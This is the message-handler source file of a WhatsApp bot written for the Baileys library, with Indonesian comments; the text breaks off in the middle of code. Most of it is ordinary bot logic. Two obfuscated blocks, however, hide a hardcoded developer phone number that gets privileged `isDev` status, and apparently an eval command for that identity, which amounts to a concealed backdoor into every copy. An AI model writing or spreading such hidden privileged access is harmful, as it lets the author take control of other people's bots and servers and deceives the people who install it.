//JANGAN DI JUAL KEMBALI KETAUAN DI JUAL KEMBALI APIKEY KU MATIIN
//KALO MAU DI JUAL BILANG KE GW HASILNYA BAGI DUA KALO GA MAU BAGI DUA YG JANGAN DI JUAL
//DARI TEXT DI ATAS TIDAK ADA KATA² TOXIC TIDAK SEPERTI YG LAIN:)
//BY SETYASTORE

//085892935752

"use strict";
const { WASocket, proto, getContentType, downloadContentFromMessage, decodeJid, generateWAMessageFromContent, generateWAMessage, WA_DEFAULT_EPHEMERAL } = require('@adiwajshing/baileys')
const axios = require('axios').default
const request = require('request')
const imgbbUploader = require("imgbb-uploader");
const { PassThrough } = require('stream')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const FormData = require('form-data')
const chalk = require('chalk')
const fs = require('fs')
const xzons = require("xzons-api");
const Math_js = require('mathjs');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const ms = require('parse-ms')
const toMS = require("ms");
const { exec, spawn } = require("child_process");
let { sizeFormatter } = require("human-readable");
let format = sizeFormatter({
  std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
  decimalPlaces: 2,
  keepTrailingZeroes: false,
  render: (literal, symbol) => `${literal} ${symbol}B`,
});

//lib/utils
const _sewa = require("../utils/sewa");
const afkg = require("../utils/afk");
const Exif = require("../utils/exif")
const { webp2mp4File } = require("../utils/convert")
const exif = new Exif()
const { allMenu, ownmenu } = require('../utils/help')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('../utils/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('../utils/setleft');
const { addResponList, delResponList, resetListAll, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('../utils/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('../utils/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('../utils/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("../utils/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("../utils/setclose");
const { isSetBot, addSetBot, removeSetBot, changeSetBot, getTextSetBot } = require('../utils/setbot');
const { getBuffer, serialize, getRandom, fetchJson, runtime, sleep, resize } = require("../utils/myfunc");
const { smsg, parseMention } = require('../utils/mysim')
let mess = JSON.parse(fs.readFileSync('./utils/mess.json'));
//database
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let set_bot = JSON.parse(fs.readFileSync('./database/set_bot.json'));
let _afks = JSON.parse(fs.readFileSync('./database/afg.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let pricelist = JSON.parse(fs.readFileSync('./database/pricelist.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilinkall = JSON.parse(fs.readFileSync('./database/antilinkall.json'))
//END
/**
 *
 * @param { string } text
 * @param { string } color
 */
const color = (text, color) => {
    return !color ? chalk.green(text) : chalk.keyword(color)(text)
}

Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)]
}

/**
 * @param {WASocket} sock
 * @param {proto.IWebMessageInfo} msg
 */
 // Bandwidth
async function checkBandwidth() {
    let ind = 0;
    let out = 0;
    for (let i of await require("node-os-utils").netstat.stats()) {
        ind += parseInt(i.inputBytes);
        out += parseInt(i.outputBytes);
    }
    return {
        download: format(ind),
        upload: format(out),
    };
}

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async (sock, msg, welcome, left, set_welcome_db, set_left_db) => {
    const { ownerNumber, ownnumber, ownerName, pathimg, logoafk, botName, youtubeName, youtube, apikey, owncek, footer } = require('../config.json')
    const extendedText = getContentType
    const setya = sock
    const gaya = '```'
    const gy = '```'
    let m = serialize(sock, msg)
    let rm = smsg(sock, msg)
    let thumb = fs.readFileSync(pathimg)
    let thum = fs.readFileSync(pathimg)
    let thumafk = fs.readFileSync(logoafk)
    //PRIVATE ✅
    function _0x3f39ff(_0x1001cf,_0x59209,_0x109082,_0xb4688e){return _0x5437(_0xb4688e- -0x2d4,_0x109082);}function _0x1b8adb(_0x4629d8,_0x2d0aa2,_0x14263d,_0x2fcad5){return _0x5437(_0x14263d- -0x1d4,_0x2fcad5);}(function(_0x586221,_0x4714dc){function _0x2e0ca0(_0x39f0ea,_0x1bf1d9,_0x457fbf,_0x81a697){return _0x5437(_0x1bf1d9- -0x136,_0x39f0ea);}function _0x411252(_0x1e2001,_0x3fdb5d,_0x350769,_0x4c5958){return _0x5437(_0x1e2001- -0xc0,_0x350769);}const _0x226c4c=_0x586221();while(!![]){try{const _0xb27893=-parseInt(_0x411252(0xd8,0xd7,0xd6,0xdb))/(0x4a3*0x7+-0x9eb*-0x1+-0x2a5f)*(parseInt(_0x411252(0xdc,0xe2,0xd9,0xde))/(0x1094+0x10a*0x13+-0x38*0xa6))+-parseInt(_0x411252(0xcf,0xd0,0xd3,0xd2))/(-0x3b8+-0x24d8+-0x11*-0x263)+parseInt(_0x411252(0xd2,0xd0,0xd6,0xd4))/(0x268*0x5+-0xaf3*0x1+-0x7*0x27)*(parseInt(_0x411252(0xd0,0xcb,0xcb,0xd8))/(-0x1*0xe9b+0x106+0xd9a))+-parseInt(_0x411252(0xd7,0xcf,0xd2,0xd0))/(-0x6e8+-0x2625+0x2d13)+parseInt(_0x411252(0xcd,0xcb,0xc7,0xce))/(0x1a06+-0x2057+0x658)+-parseInt(_0x2e0ca0(0x54,0x58,0x5a,0x5c))/(-0x254+-0x1d1f+0x1f7b)+parseInt(_0x2e0ca0(0x60,0x65,0x61,0x6a))/(-0x2*-0xde6+0x2710+0x1*-0x42d3);if(_0xb27893===_0x4714dc)break;else _0x226c4c['push'](_0x226c4c['shift']());}catch(_0xc8ba25){_0x226c4c['push'](_0x226c4c['shift']());}}}(_0xbc08,0xdaeb5*-0x1+-0xd966*0xd+-0x23afc9*-0x1));const _0x4f9b1f=(function(){let _0x25a49d=!![];return function(_0x45b7c5,_0xed50d1){const _0x48b904=_0x25a49d?function(){function _0x4634b8(_0x343ad1,_0x54d712,_0x14d1c7,_0x327edb){return _0x5437(_0x54d712- -0x47,_0x343ad1);}if(_0xed50d1){const _0x42db90=_0xed50d1[_0x4634b8(0x14a,0x14a,0x14d,0x152)](_0x45b7c5,arguments);return _0xed50d1=null,_0x42db90;}}:function(){};return _0x25a49d=![],_0x48b904;};}()),_0x373abe=_0x4f9b1f(this,function(){const _0x5a4ffe={};_0x5a4ffe[_0x3c076c(0x18d,0x186,0x181,0x18a)]=_0x3c076c(0x18e,0x188,0x187,0x185)+'+$';function _0x3c076c(_0x412e98,_0x5eed43,_0x179175,_0x5f0d35){return _0x5437(_0x5eed43- -0xe,_0x412e98);}function _0x3cfc8c(_0x368072,_0x375884,_0x193726,_0x52443a){return _0x5437(_0x193726- -0xc3,_0x52443a);}const _0x5d4e20=_0x5a4ffe;return _0x373abe['toString']()[_0x3c076c(0x182,0x185,0x186,0x181)](_0x5d4e20[_0x3c076c(0x183,0x186,0x183,0x186)])['toString']()[_0x3cfc8c(0xd2,0xd8,0xd2,0xd7)+'r'](_0x373abe)['search']('(((.+)+)+)'+'+$');});_0x373abe();function _0xbc08(){const _0x1f478e=['1699020onhThi','2501408gxOIDw','2093112muImCo','3525006SljLJt','535615LxZiWu','apply','20vRLyZr','search','Ksqye','constructo','(((.+)+)+)','6898224YEmBSS','1JFlXya','sapp.net','752@s.what','29353158UOcMjz'];_0xbc08=function(){return _0x1f478e;};return _0xbc08();}function _0x5437(_0x1473f6,_0x5e92aa){const _0x3e7b31=_0xbc08();return _0x5437=function(_0x3b95bf,_0x314202){_0x3b95bf=_0x3b95bf-(0x3*0x57e+-0x14e5*0x1+0x4*0x17e);let _0x3ccfbd=_0x3e7b31[_0x3b95bf];return _0x3ccfbd;},_0x5437(_0x1473f6,_0x5e92aa);}let dev='6285892935'+_0x3f39ff(-0x140,-0x135,-0x13e,-0x13a)+_0x1b8adb(-0x42,-0x39,-0x3b,-0x3c);
    const time = moment().tz('Asia/Jakarta').format('HH:mm:ss')
    const tanggal = moment().tz("Asia/Jakarta").format("dddd, ll")
    const jam = moment().format("HH:mm:ss z")
    let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
    var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
    const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
    if (msg.key && msg.key.remoteJid === 'status@broadcast') return
    if (!msg.message) return

	const type = getContentType(msg.message)
    const quotedType = getContentType(msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) || null
    if (type == 'ephemeralMessage') {
        msg.message = msg.message.ephemeralMessage.message
        msg.message = msg.message.ephemeralMessage.message.viewOnceMessage
    }
    if (type == 'viewOnceMessage') {
        msg.message = msg.message.viewOnceMessage.message
    }

    const botId = sock.user.id.includes(':') ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : sock.user.id

    const botNumber = await sock.decodeJid(sock.user.id)
    const from = msg.key.remoteJid
    const rizkyy = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type == "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (type == "messageContextInfo") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
    const body = type == 'conversation' ? msg.message?.conversation : msg.message[type]?.caption || msg.message[type]?.text || ''
    const chata = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type == "templateButtonReplyMessage" && msg.message.templateButtonReplyMessage.selectedId) ? msg.message.templateButtonReplyMessage.selectedId : (type == "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (type == "messageContextInfo") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
    const responseMessage = type == 'listResponseMessage' ? msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || '' : type == 'buttonsResponseMessage' ? msg.message?.buttonsResponseMessage?.selectedButtonId || '' : ''
    const isGroup = from.endsWith('@g.us')
    const budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''

    var sender = isGroup ? msg.key.participant : msg.key.remoteJid
    sender = sender.includes(':') ? sender.split(':')[0] + '@s.whatsapp.net' : sender
    const senderName = msg.pushName
    const senderNumber = sender.split('@')[0]
    const pushname = msg.pushName

    const groupMetadata = isGroup ? await sock.groupMetadata(from) : null
    const groupName = groupMetadata?.subject || ''
    const groupMembers = groupMetadata?.participants || []
    const groupAdmins = groupMembers.filter((v) => v.admin).map((v) => v.id)

    const isCmd = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#/$%^&.+-,\\\©^]/.test(chata)
    const prefix = isCmd ? body[0] : ''
    const isGroupAdmins = groupAdmins.includes(sender)
    const isBotGroupAdmins = groupMetadata && groupAdmins.includes(botId)
    const isOwner = ownerNumber.includes(sender)
    const isDev = dev.includes(sender) 
    const Xcommand = chata.toLowerCase().split(' ')[0] || ''
    const XisCmd = Xcommand.startsWith(prefix)
    
    let command = isCmd ? chata.slice(1).trim().split(' ').shift().toLowerCase() : ''
    let responseId = msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || msg.message?.buttonsResponseMessage?.selectedButtonId || null
    let args = body.trim().split(' ').slice(1)
    const argr = rizkyy.split(' ') 
    let full_args = body.replace(command, '').slice(1).trim()
    let q = args.join(" ")
    
    const isAntiLinkAll = antilinkall.includes(from) ? true : false
    const isAfkOn = afkg.checkAfkUser(sender, _afks)
    const isAntiLink = antilink.includes(from) ? true : false
    const isAntiWame = antiwame.includes(from) ? true : false
    const isPricelist = pricelist.includes(from) ? true : false
    const isSewa = _sewa.checkSewaGroup(from, sewa)
    const isWelcome = isGroup ? welcome.includes(from) ? true : false : false
    const isLeft = isGroup ? left.includes(from) ? true : false : false
    const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
    const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
    const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
    mention != undefined ? mention.push(mentionByReply) : []
    const mentionUser = mention != undefined ? mention.filter(n => n) : []
    let mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []

    async function downloadAndSaveMediaMessage (type_file, path_file) {
        	if (type_file === 'image') {
                var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'video') {
                var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'sticker') {
                var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'audio') {
                var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	}
        }
        
        async function sendStickerFromUrl(from, url, packname1 = stc.packname, author1 = stc.author, options = {}) {
        	var names = Date.now() / 10000;
        	var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
	            });
        	};
            exif.create(packname1, author1, `sendstc_${names}`)
        	download(url, './temp/' + names + '.png', async function () {
                let filess = './temp/' + names + '.png'
        	    let asw = './temp/' + names + '.webp'
        	    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, async (err) => {
        	        exec(`webpmux -set exif ./temp/sendstc_${names}.exif ${asw} -o ${asw}`, async (error) => {
                        setya.sendMessage(from, { sticker: fs.readFileSync(asw) }, options)
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
        	        })
                })
        	})
        }
        
        const sendFileFromUrl = async (from, url, caption, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headerd["content-type"]
            let type = mime.split("/")[0]+"Message"
            if (mime.split("/")[0] === "image") {
               var img = await getBuffer(url)
               return setya.sendMessage(from, { image: img, caption: caption }, options)
            } else if (mime.split("/")[0] === "video") {
               var vid = await getBuffer(url)
               return setya.sendMessage(from, { video: vid, caption: caption }, options)
            } else if (mime.split("/")[0] === "audio") {
               var aud = await getBuffer(url)
               return setya.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
            } else {
               var doc = await getBuffer(url)
               return setya.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
            }
        }
        
        //jeda time
        setInterval(() => {
        for (let i of Object.values(opengc)) {
            if (Date.now() >= i.time) {
                setya.groupSettingUpdate(i.id, "not_announcement")
                .then((res) =>
                setya.sendMessage(i.id, { text: `Waktu Jeda Telah Selesai` }))
                .catch((err) =>
                setya.sendMessage(i.id, { text: 'Error' }))
                delete opengc[i.id]
                fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
            }
        }
    }, 1000)
        
        setya.createMessage = async (jidnya, kontennya, optionnya) => {
            return await generateWAMessage(jidnya, kontennya, {...optionnya,userJid: setya.authState.creds.me.id,upload: setya.waUploadToServer})
            }

        const sendButton5 = async (id, text1, desc1, yo) => {
            var buatpesan = await generateWAMessageFromContent(from, {
            "templateMessage": {
            "hydratedTemplate": {
            ...yo.message,
            "hydratedContentText": text1,
            "hydratedFooterText": desc1,
            "hydratedButtons": [
            {
            "urlButton": {
            "displayText": "Sewabot",
            "url": `https://wa.me/${owncek}`
            }
            },
            {
            "urlButton": {
            "displayText": "Youtube",
            "url": `${youtube}`
            }
            },
            {
            "quickReplyButton": {
            "displayText": "📓Pricelist",
            "id": `${prefix}menu`
            }
            },
            {
            "quickReplyButton": {
            "displayText": "Owner👀",
            "id": `${prefix}owner`
            }
          }
        ]
      }
    }
  }, {})
setya.relayMessage(id, buatpesan.message, { messageId: buatpesan.key.id })
}

    const isImage = type == 'imageMessage'
    const isVideo = type == 'videoMessage'
    const isAudio = type == 'audioMessage'
    const isSticker = type == 'stickerMessage'
    const isContact = type == 'contactMessage'
    const isLocation = type == 'locationMessage'

    const isQuoted = type == 'extendedTextMessage'
    const isQuotedImage = isQuoted && quotedType == 'imageMessage'
    const isQuotedVideo = isQuoted && quotedType == 'videoMessage'
    const isQuotedAudio = isQuoted && quotedType == 'audioMessage'
    const isQuotedSticker = isQuoted && quotedType == 'stickerMessage'
    const isQuotedContact = isQuoted && quotedType == 'contactMessage'
    const isQuotedLocation = isQuoted && quotedType == 'locationMessage'

    var mediaType = type
    var stream
    if (isQuotedImage || isQuotedVideo || isQuotedAudio || isQuotedSticker) {
        mediaType = quotedType
        msg.message[mediaType] = msg.message.extendedTextMessage.contextInfo.quotedMessage[mediaType]
        stream = await downloadContentFromMessage(msg.message[mediaType], mediaType.replace('Message', '')).catch(console.error)
    }
    
    //SEWA WAKTU
_sewa.expiredCheck(setya, sewa)
   //OWN WAKTU

    if (!isGroup && !isCmd) console.log(color(`[ ${time} ]`, 'white'), color('[ PRIVATE ]', 'aqua'), color(body.slice(0, 50), 'white'), 'from', color(senderNumber, 'yellow'))
    if (isGroup && !isCmd) console.log(color(`[ ${time} ]`, 'white'), color('[  GROUP  ]', 'aqua'), color(body.slice(0, 50), 'white'), 'from', color(senderNumber, 'yellow'), 'in', color(groupName, 'yellow'))
    if (!isGroup && isCmd) console.log(color(`[ ${time} ]`, 'white'), color('[ COMMAND ]', 'aqua'), color(body, 'white'), 'from', color(senderNumber, 'yellow'))
    if (isGroup && isCmd) console.log(color(`[ ${time} ]`, 'white'), color('[ COMMAND ]', 'aqua'), color(body, 'white'), 'from', color(senderNumber, 'yellow'), 'in', color(groupName, 'yellow'))

function hitungmundur(bulan, tanggal) {
            let from = new Date(`${bulan} ${tanggal}, 2022 00:00:00`).getTime();
            let now = Date.now();
            let distance = from - now;
            let days = Math.floor(distance / (1000 * 60 * 60 * 24));
            let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            let seconds = Math.floor((distance % (1000 * 60)) / 1000);
            return days + "Hari " + hours + "Jam " + minutes + "Menit " + seconds + "Detik"
        }
        
        var { download, upload } = await checkBandwidth();
        let mundur = hitungmundur(7, 9)
        var menunya = allMenu(ucapanWaktu, pushname, mundur, upload, download, ownerName, youtubeName, botName, jam, tanggal, isOwner, sender, prefix)
        var menuown = ownmenu(pushname, ownerNumber, prefix)
        
    const reply = async (text) => {
        return sock.sendMessage(from, { text: text.trim() }, { quoted: msg })
    }
    
    function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        
        const isUrl = (url) => {
        	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        
        const sendContact = (jid, numbers, name, quoted, mn) => {
        	let number = numbers.replace(/[^0-9]/g, '')
        	const vcard = 'BEGIN:VCARD\n' 
        	+ 'VERSION:3.0\n' 
        	+ 'FN:' + name + '\n'
        	+ 'ORG:;\n'
        	+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
        	+ 'END:VCARD'
        	return setya.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
        }
        
        const isEmoji = (emo) => {
            let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
            let regexEmoji = new RegExp(emoji_ranges, 'gi');
            return emo.match(regexEmoji)
        }
        
        async function getGcName(groupID) {
            try {
                let data_name = await setya.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '*Group Tidak Ada*'
            }
        }
    
    function mentions(teks, mems = [], id) {
        	if (id == null || id == undefined || id == false) {
        	    let res = setya.sendMessage(from, { text: teks, mentions: mems })
        	    return res
        	} else {
                let res = setya.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
                return res
            }
        }
        

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
 "orderMessage": {
"orderId": orid, // Ganti Idnya
"thumbnail": img, // Ganti Imagenya
"itemCount": itcount, // Ganti Item Countnya
"status": "INQUIRY", // Jangan Diganti
"surface": "CATALOG", // Jangan Diganti
"orderTitle": title, // Ganti Titlenya
"message": text, // Ganti Messagenya
"sellerJid": sellers, // Ganti sellernya
"token": tokens, // Ganti tokenya
"totalAmount1000": ammount, // Ganti Total Amountnya
"totalCurrencyCode": "IDR", // Terserah
}
}), { userJid: jid })
setya.relayMessage(jid, order.message, { messageId: order.key.id})
}
 
//MULAI AFK
	if (isGroup) {
		for (let x of mentionUser) {
		    if (afkg.checkAfkUser(x, _afks)) {
			const getId = afkg.getAfkId(x, _afks)
			const getReason = afkg.getAfkReason(getId, _afks)
			const getTime = afkg.getAfkTime(getId, _afks)
			//if (riz.message.extendedTextMessage != undefined){ 
	        try {
            var afpk = await setya.profilePictureUrl(mentionUser[0], 'image')
            } catch {
            var afpk = 'https://i.ibb.co/Twkhgy9/images-4.jpg'
            }
            var thumeb = await getBuffer(afpk)
			const cptl = `*ꞌꞋ ࣪𓂃 ִֶָ Admin Afk ִֶָ 𓂃 ࣪ꞌꞋ*

O  Saat Ini @${mentionUser[0].split("@")[0]} Sedang Offline/Afk
O *Alasan*  : ${getReason}
O *Afk Sejak* : ${getTime}`
      setya.sendMessage(from, { text: cptl, contextInfo:{ mentionedJid: [mentionUser], externalAdReply:{ title: `SEDANG OFFLINE`, body: "Mode Afk Aktif", thumbnail: thumafk, sourceUrl: `https://wa.me/${x}`, mediaUrl: '', renderLargerThumbnail: true, showAdAttribution: false, mediaType: 1 }}}, { quoted: m });
      //sendMess(x, `Assalamualaikum\n\n_Ada Yg Mencari Kamu Saat Kamu Offline/Afk_\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nDi Group : ${groupName}\nPesan : ${chata}`)
      }}
      //KEMBALI DARI AFK
	  if (afkg.checkAfkUser(sender, _afks)) {
      const getTime = afkg.getAfkTime(sender, _afks)
	  const getReason = afkg.getAfkReason(sender, _afks)
	  const ittung = ms(await Date.now() - getTime)
      try {
      var afpkk = await setya.profilePictureUrl(mentionUser[0], 'image')
      } catch {
      var afpkk = 'https://i.ibb.co/Twkhgy9/images-4.jpg'
      }
      var thumbw = await getBuffer(afpkk)
	  const pep = `*${pushname}* Telah Kembali Dari Afknya!`
      setya.sendMessage(from, { text: pep, contextInfo:{ mentionedJid: [sender], externalAdReply:{ title: `KEMBALI ONLINE`, body: "Mode Afk Nonaktif", thumbnail: thumafk, sourceUrl: `https://wa.me/${sender}`, mediaUrl: '', renderLargerThumbnail: true, showAdAttribution: false, mediaType: 1 }}}, { quoted: m });
	  _afks.splice(afkg.getAfkPosition(sender, _afks), 1)
	  fs.writeFileSync('./database/afkg.json', JSON.stringify(_afks))
	  }
	  }

    const replyDeface = (teks) => {
            return setya.sendMessage(from, {
                text: teks, contextInfo: {
                    externalAdReply: {
                        title: `Multi Device`,
                        body: `${botName}`,
                        mediaType: 2,
                        thumbnail: thumb,
                        sourceUrl: `https://wa.me/${owncek}`
                    }
                }
            }, { quoted: msg })
        }
        
        //ENC PRIVATE SOALNYA🥲
function _0x1b8d(){const _0x53d1d6=['apply','Dari\x20Owner','4611621cgJotI','format','50CpgfzJ','util','627201oNLQDs','yellow','KjOsO','H:mm:ss','inspect','prYjd','4735996dHIVxd','startsWith','2xnlFAt','log','messageTim','toString','string','659865MvBpLO','\x20aowkoakwo','ZNkiX','GlNuA','SNtXN','slice','estamp','32887368qxQNXv','295476GTRdhG','DD/MM/YY\x20H','9920240pniRxw','search','[\x20EVAL\x20]'];_0x1b8d=function(){return _0x53d1d6;};return _0x1b8d();}function _0xca35(_0xca3591,_0x15ec3e){const _0x4471bb=_0x1b8d();return _0xca35=function(_0x50f92c,_0x337313){_0x50f92c=_0x50f92c-(-0xfac+0x1ce1+-0x9*0x15b);let _0x39536c=_0x4471bb[_0x50f92c];return _0x39536c;},_0xca35(_0xca3591,_0x15ec3e);}(function(_0x2b4d30,_0x21e8eb){const _0x2cba38=_0x2b4d30();function _0x21a37f(_0x156cb4,_0x1673cb,_0x221038,_0x53ef90){return _0xca35(_0x221038- -0x13a,_0x53ef90);}function _0xd6aa00(_0x341dd1,_0x2bdf6c,_0x12fb86,_0x26621a){return _0xca35(_0x2bdf6c-0x265,_0x26621a);}while(!![]){try{const _0x544f2f=-parseInt(_0xd6aa00(0x36f,0x37f,0x373,0x370))/(-0x2178+-0xb*-0x2fa+0xbb)+parseInt(_0xd6aa00(0x35d,0x367,0x35c,0x35c))/(0xb*0x16a+-0x428+-0xb64)*(parseInt(_0xd6aa00(0x374,0x36c,0x369,0x36d))/(-0x7*0x6d+0x22bd*0x1+-0x1fbf))+-parseInt(_0xd6aa00(0x385,0x385,0x389,0x391))/(-0x2*0x89a+0x14e8+-0x3b0)+-parseInt(_0x21a37f(-0x19,-0x31,-0x22,-0x1c))/(0x1f7d+0xd60+-0x2cd8)*(-parseInt(_0xd6aa00(0x37a,0x374,0x364,0x365))/(0x4*-0x35f+0x1*-0x84e+0x15d*0x10))+-parseInt(_0x21a37f(-0x2b,-0x31,-0x24,-0x32))/(0x90f*0x3+0x1581*-0x1+-0x11*0x55)+-parseInt(_0xd6aa00(0x371,0x376,0x371,0x380))/(-0x1977+-0x42b*-0x2+-0x17*-0xbf)+parseInt(_0xd6aa00(0x37f,0x373,0x381,0x379))/(-0x10*0x238+-0x2091*0x1+-0x441a*-0x1);if(_0x544f2f===_0x21e8eb)break;else _0x2cba38['push'](_0x2cba38['shift']());}catch(_0x251e66){_0x2cba38['push'](_0x2cba38['shift']());}}}(_0x1b8d,-0x1b166+0xa43a4+0x17258));const _0x57332f=(function(){const _0xe18d14={'GlNuA':function(_0xcb2774,_0x3ed322){return _0xcb2774!==_0x3ed322;},'KjOsO':'hDIbr','ugsVH':function(_0x568646,_0x22779a){return _0x568646(_0x22779a);}};let _0x9c4dc9=!![];return function(_0x2fb4c9,_0x41b24f){const _0x3c6cbd={'SNtXN':function(_0x120d60,_0x2db86e){return _0xe18d14['ugsVH'](_0x120d60,_0x2db86e);}},_0x34c1c9=_0x9c4dc9?function(){function 